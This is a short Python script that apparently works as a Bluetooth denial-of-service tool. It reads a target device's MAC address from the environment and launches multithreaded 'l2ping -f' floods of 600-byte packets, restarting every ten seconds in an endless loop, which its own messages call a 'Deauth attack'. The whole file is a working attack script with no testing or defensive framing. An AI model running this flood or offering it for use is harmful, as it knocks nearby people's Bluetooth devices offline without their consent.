import subprocess
from concurrent.futures import ThreadPoolExecutor
import time
import os
from dotenv import load_dotenv
from rich import print
from rich.console import Console

load_dotenv()
TARGET_DEVICE_MAC = os.getenv('TARGET_DEVICE_MAC')
interface = os.getenv('INTERFACES', 'hci0')

console = Console()


def deauth_Method_1(target_addr, packages_size):
    subprocess.run(
        ['l2ping', '-i', interface, '-s', str(packages_size), '-f', target_addr],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )


def _kick_(deauth_func, target_addr, packages_size, threads_count, start_time=1):
    for i in range(start_time, 0, -1):
        console.print(f'[red] :rocket: Starting Deauth attack in {i}')
        time.sleep(1)
        console.clear()
    console.print('[red] :rocket: Starting')

    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        futures = [executor.submit(deauth_func, target_addr, packages_size) for _ in range(threads_count)]
        for f in futures:
            f.result()


if __name__ == '__main__':
    threads_count = min(os.cpu_count() or 1, 10)
    try:
        while True:
            _kick_(deauth_Method_1, TARGET_DEVICE_MAC, 600, threads_count, 1)
            print("Restarting Attack in 10s")
            time.sleep(10)
    except KeyboardInterrupt:
        console.print('\n[red] :fax: Aborted')
        exit()
